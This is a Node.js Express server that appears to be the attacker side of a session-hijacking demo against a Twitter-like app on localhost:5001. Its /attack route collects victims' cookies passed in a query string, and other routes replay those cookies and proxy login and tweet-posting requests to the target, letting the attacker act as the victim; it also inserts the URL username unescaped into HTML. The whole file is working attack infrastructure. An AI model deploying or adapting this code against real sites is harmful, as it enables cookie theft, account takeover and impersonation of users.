const express = require('express');
const fetch = require('node-fetch').default;
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json());
app.use(express.static('malicious-assets'));

let lastUserCookies = {};

app.get('/attack', (req, res) => {
  const { cookies } = req.query;
  lastUserCookies = decodeURIComponent(cookies)
    .split('; ')
    .reduce((acc, cookie) => {
      const [name, value] = cookie.split('=');
      acc[name] = value;
      return acc;
    }, {});
  return res.redirect('/');
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'malicious-assets/home.html'));
});

app.get('/login', (req, res) => {
  for (let cookieName in lastUserCookies) {
    res.cookie(cookieName, lastUserCookies[cookieName]);
  }
  res.sendFile(path.join(__dirname, 'malicious-assets/login.html'));
});

app.get('/:username', (req, res) => {
  for (let cookieName in lastUserCookies) {
    res.cookie(cookieName, lastUserCookies[cookieName]);
  }
  const htmlFile = fs.readFileSync(path.join(__dirname, 'malicious-assets/profile.html'), 'utf-8');
  const content = htmlFile.replace(/#{username}/g, req.params.username);
  res.send(content);
});

app.post('/session', async (req, res) => {
  const loginRes = await fetch('http://localhost:5001/api/session', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    credentials: 'include',
    body: JSON.stringify(req.body)
  });
  const body = await loginRes.json();
  res.status(loginRes.status);
  return res.json(body);
});

app.post('/tweets', async (req, res) => {
  const postTweetRes = await fetch('http://localhost:5001/api/tweets', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      cookie: req.get('cookie')
    },
    body: JSON.stringify(req.body)
  });
  const body = await postTweetRes.json();
  res.status(postTweetRes.status);
  return res.json(body);
});

const port = 5002;
app.listen(port, () => console.log('Server is listening on port', port));